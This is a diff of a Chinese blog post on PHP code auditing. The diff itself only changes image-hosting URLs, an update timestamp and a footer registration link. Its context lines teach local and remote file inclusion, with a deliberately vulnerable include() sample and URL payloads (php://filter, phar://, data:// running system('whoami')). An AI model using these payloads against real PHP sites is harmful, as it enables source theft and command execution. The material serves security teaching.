@@ -14,21 +14,21 @@
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
 <meta property="og:description" content="0x01前提概要嘤嘤嘤，准备开个坑，讲讲PHP的代码审计，也是自己最近学习总结的一些沉淀吧，欢迎大佬们一起沟通交流呀，本菜鸡在这献丑了。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/74b0j.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/7f19c.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/s4y2k.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/yiq5c.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/uh2yh.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/6yi80.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/30tpa.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/okq3a.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/3y4nx.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/6gxav.png">
-<meta property="og:updated_time" content="2019-03-12T09:07:14.359Z">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/74b0j.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/7f19c.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/s4y2k.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/yiq5c.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/uh2yh.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/6yi80.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/30tpa.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/okq3a.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/3y4nx.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/6gxav.png">
+<meta property="og:updated_time" content="2019-04-10T04:40:33.775Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php代码审计专题(1)">
 <meta name="twitter:description" content="0x01前提概要嘤嘤嘤，准备开个坑，讲讲PHP的代码审计，也是自己最近学习总结的一些沉淀吧，欢迎大佬们一起沟通交流呀，本菜鸡在这献丑了。">
-<meta name="twitter:image" content="http://po8p59xe5.bkt.clouddn.com/blog/74b0j.png">
+<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/74b0j.png">
     
     
         
@@ -169,25 +169,25 @@
 </ol>
 <h2 id="1-LFI-Local-File-Inclusion"><a href="#1-LFI-Local-File-Inclusion" class="headerlink" title="1. LFI(Local File Inclusion)"></a>1. LFI(Local File Inclusion)</h2><p>本地文件包含，顾名思义就是只能打开，并且包含本地文件的漏洞。大部分情况下，我们遇到的漏洞都是LFI。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> ($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/74b0j.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/74b0j.png" alt="img"></p>
 <h2 id="2-RFI-Remote-File-Inclusion"><a href="#2-RFI-Remote-File-Inclusion" class="headerlink" title="2. RFI(Remote File Inclusion)"></a>2. RFI(Remote File Inclusion)</h2><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但是RFI的条件比LFI的条件苛刻点需要在PHP.ini中作出如下配置：</p>
 <ol>
 <li>allow_url_fopen = On</li>
 <li>allow_url_include = On</li>
 </ol>
 <p>两个配置选项均需要为On，才能远程包含文件成功。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/7f19c.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/7f19c.png" alt="img"></p>
 <h2 id="3-包含姿势总结"><a href="#3-包含姿势总结" class="headerlink" title="3. 包含姿势总结"></a>3. 包含姿势总结</h2><h3 id="3-1-php伪协议"><a href="#3-1-php伪协议" class="headerlink" title="3.1 php伪协议"></a>3.1 php伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>利用条件：</p>
 <ol>
 <li>allow_url_include = On。</li>
 <li>对allow_url_fopen不做要求。</li>
 </ol>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/s4y2k.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/s4y2k.png" alt="img"></p>
 <h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>利用条件：没有前置条件</p>
 <p>姿势：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/yiq5c.png" alt="img"></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/uh2yh.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/yiq5c.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/uh2yh.png" alt="img"></p>
 <p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。其他姿势：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
 <p>效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。</p>
@@ -196,12 +196,12 @@
 <li>php版本大于等于php5.3.0</li>
 </ol>
 <p>姿势：</p>
-<p>假设有个文件index.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<img src="http://po8p59xe5.bkt.clouddn.com/blog/6yi80.png" alt="img"></p>
+<p>假设有个文件index.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，如下：<img src="http://l1nk3r.xmutsec.com/blog/6yi80.png" alt="img"></p>
 <p>指定绝对路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://Applications/MxSrvs/www/index.txt.zip/index.txt</span><br></pre></td></tr></table></figure>
 <p>使用相对路径（这里index.txt.zip就在当前目录下）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://index.txt.zip/index.txt</span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/30tpa.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/30tpa.png" alt="img"></p>
 <h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p>利用条件：</p>
 <ol>
 <li>php版本大于等于php5.3.0</li>
@@ -218,19 +218,19 @@
 </ol>
 <p>姿势一：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/okq3a.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/okq3a.png" alt="img"></p>
 <p>执行命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;</span><br></pre></td></tr></table></figure>
 <p>姿势二：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
 <p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/3y4nx.png" alt="img"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/3y4nx.png" alt="img"></p>
 <p>执行命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</span><br></pre></td></tr></table></figure>
 <p>其中<code>PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</code>的base64解码为：<code>&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
 <h3 id="3-2-包含sessions"><a href="#3-2-包含sessions" class="headerlink" title="3.2 包含sessions"></a>3.2 包含sessions</h3><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
 <p>姿势：</p>
-<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<img src="http://po8p59xe5.bkt.clouddn.com/blog/6gxav.png" alt="img"></p>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。<img src="http://l1nk3r.xmutsec.com/blog/6gxav.png" alt="img"></p>
 <p>常见的php-session存放位置：</p>
 <ol>
 <li>/var/lib/php/sess_PHPSESSID</li>
@@ -408,6 +408,7 @@
         
       </ul>
     </nav>
+    <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
   </div>
 </footer>
 
